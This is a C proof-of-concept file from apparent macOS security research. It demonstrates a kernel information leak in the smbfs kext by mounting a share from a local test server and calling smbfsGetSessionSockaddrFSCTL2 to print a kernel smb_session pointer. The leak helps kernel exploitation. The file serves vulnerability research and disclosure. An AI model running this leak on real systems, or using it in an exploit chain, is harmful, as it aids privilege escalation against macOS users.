//
//  main.c
//  poc_info_disclosure
//
//  Created by sreejith on 3/16/22.
//

#include <stdio.h>
#include <string.h>

#include <sys/mount.h>

#include <arpa/inet.h>
#include <IOKit/kext/KextManager.h>

#include <smbfs/smb_dev.h>
#include <smbfs/smb_dev_2.h>
#include <smbfs/smbfs.h>
#include <smbfs/smbclient_internal.h>
#include <smbfs/netbios.h>

#include <xe_smbx/smbx_conf.h>


///
/// The `smbfsGetSessionSockaddrFSCTL2` fcntl command is used by userland process to
/// retreive the original SMB server IP address that was used to setup the connection with the
/// SMB server. This fcntl command is handled by the method  `smbfs_vnop_ioctl` defined in
/// `smbfs_vnops.c` as shown below :-
///
/// static int32_t smbfs_vnop_ioctl(struct vnop_ioctl_args *ap)
/// {
///     ...
///     struct smb_session* sessionp = SS_TO_SESSION(share);
///     ....
///     switch (ap->a_command) {
///         ...
///         case smbfsGetSessionSockaddrFSCTL2: {
///             struct smbSockAddrPB *pb = (struct smbSockAddrPB *) ap->a_data;
///
///             // ***NOTE***: The pointer to `struct smb_session` is assigned to pb->sessionp
///             // The `struct smbSockAddrPB *pb` will be copied back to userland by `sys_fcntl_nocancel`
///             // after the `smbfs_vnop_ioctl` returns
///             pb->sessionp = sessionp;
///
///             /* <72239144> Return original server IP address that was used */
///             if (sessionp->session_saddr) {
///                 memcpy(&pb->addr, sessionp->session_saddr,
///                     sessionp->session_saddr->sa_len);
///             } else {
///                 error = EINVAL; /* Better never happen, but just in case */
///             }
///             break;
///         }
///    ...
///    }
///    ...
/// }
///
/// As noted in the code snippet above, the address of associated `struct smb_session` is
/// returned to the userland. Userland process may provide this value with the `SMBIOC_NEGOTIATE`
/// ioctl command to reuse a existing smb_session while mounting multiple shares from the same
/// SMB server*. The `struct smb_session` is of size 1296 and is allocated on kext.1664 zone.
/// This information disclosure vulnerability may be used in exploits to allocate kernel memory
/// with controlled data at known address etc.
///
/// The POC below demonstrates this information disclosure vulnerabilty.
///
/// NOTE: This vulnerabilty is not used in any of the exploits developed during this research
///


/// Directly using `__fcntl` because fcntl stub defined `xnu/libsyscall/wrappers/cancellable/fcntl-base.c`
/// will trim the data pointer to 32 bit integer before passing it down to `__fcntl` method
extern int __fcntl(int fd, int cmd, void* data);


int smb_client_load_kext(void) {
    return KextManagerLoadKextWithIdentifier(CFSTR("com.apple.filesystems.smbfs"), NULL);
}


int smb_client_open_dev(void) {
    char path[PATH_MAX];
    for (int i=0; i<1024; i++) {
        snprintf(path, sizeof(path), "/dev/nsmb%x", i);
        int fd = open(path, O_RDONLY);
        if (fd >= 0) {
            return fd;
        }
    }
    return -1;
}


int main(int argc, const char * argv[]) {
    smb_client_load_kext();
    
    /// STEP 1: Open a new SMB device
    int smb_dev = smb_client_open_dev();
    if (smb_dev < 0) {
        printf("[ERROR] failed to open smb dev, err: %s\n", strerror(errno));
        exit(1);
    }
    
    /// Socket address of xe_smbx server
    struct sockaddr_in smb_addr;
    bzero(&smb_addr, sizeof(smb_addr));
    smb_addr.sin_family = AF_INET;
    smb_addr.sin_len = sizeof(smb_addr);
    smb_addr.sin_port = htons(XE_SMBX_PORT);
    inet_aton(XE_SMBX_HOST, &smb_addr.sin_addr);
    
    /// STEP 2: Setup a new session
    struct smbioc_negotiate negotiate_req;
    bzero(&negotiate_req, sizeof(negotiate_req));
    negotiate_req.ioc_version = SMB_IOC_STRUCT_VERSION;
    negotiate_req.ioc_saddr = (struct sockaddr*)&smb_addr;
    negotiate_req.ioc_saddr_len = sizeof(smb_addr);
    negotiate_req.ioc_extra_flags |= SMB_FORCE_NEW_SESSION;
    negotiate_req.ioc_ssn.ioc_owner = getuid();
    negotiate_req.ioc_extra_flags |= SMB_SMB1_ENABLED;
    
    if (ioctl(smb_dev, SMBIOC_NEGOTIATE, &negotiate_req)) {
        printf("[ERROR] SMBIOC_NEGOTIATE ioctl failed, err: %s\n", strerror(errno));
        close(smb_dev);
        exit(1);
    }
    
    if (negotiate_req.ioc_errno) {
        printf("[ERROR] SMBIOC_NEGOTIATE returned non zero ioc_errno %d\n", negotiate_req.ioc_errno);
        printf("[ERROR] Make sure that xe_smbx server is running\n");
        exit(1);
    }
    
    /// STEP 3: Setup a new share
    struct smbioc_share tcon_req;
    bzero(&tcon_req, sizeof(tcon_req));
    tcon_req.ioc_version = SMB_IOC_STRUCT_VERSION;
    strcpy(tcon_req.ioc_share, "test_share");
    
    if (ioctl(smb_dev, SMBIOC_TCON, &tcon_req)) {
        printf("[ERROR] SMBIOC_TCON ioctl failed, err: %s\n", strerror(errno));
        exit(1);
    }
    
    /// STEP 4: Mount the SMB share
    struct smb_mount_args mount_args;
    bzero(&mount_args, sizeof(mount_args));
    mount_args.version = SMB_IOC_STRUCT_VERSION;
    mount_args.dev = smb_dev;
    mount_args.uid = getuid();
    mount_args.gid = getgid();
    mount_args.file_mode = S_IRWXU;
    mount_args.dir_mode = S_IRWXU;
    /// xe_smbx server only have very limited capabilities. This flag is required for
    /// successfully mouting the SMB share using xe_smbx server.
    mount_args.altflags |= SMBFS_MNT_VALIDATE_NEG_OFF;
    
    char mount_path[] = "/tmp/poc_sockaddr_oob_read_XXXXXXXXXX";
    mkdtemp(mount_path);
    int res = mount("smbfs", mount_path, MNT_RDONLY | MNT_DONTBROWSE, &mount_args);
    if (res) {
        printf("[ERROR] smb mount failed, err: %s\n", strerror(errno));
        exit(1);
    }
    
    /// STEP 5: Open a file inside SMB mount
    int root_fd = open(mount_path, O_RDONLY);
    if (root_fd < 0) {
        printf("[ERROR] failed to open root directory, err: %s\n", strerror(errno));
        exit(1);
    }
    
    /// STEP 6: Execute `smbfsGetSessionSockaddrFSCTL2` to obtain the address of associated
    /// smb session
    struct smbSockAddrPB sockaddr_pb;
    bzero(&sockaddr_pb, sizeof(sockaddr_pb));
    res = __fcntl(root_fd, (uint)smbfsGetSessionSockaddrFSCTL2, &sockaddr_pb);
    if (res) {
        printf("[ERROR] smbfsGetSessionSockaddrFSCTL fsctl failed, err: %s\n", strerror(errno));
        exit(1);
    }
    
    printf("[INFO] leaked pointer %p to smb_session in kext.1664 zone\n", sockaddr_pb.sessionp);
    
    close(root_fd);
    unmount(mount_path, MNT_FORCE);
    rmdir(mount_path);
    close(smb_dev);
    return 0;
}
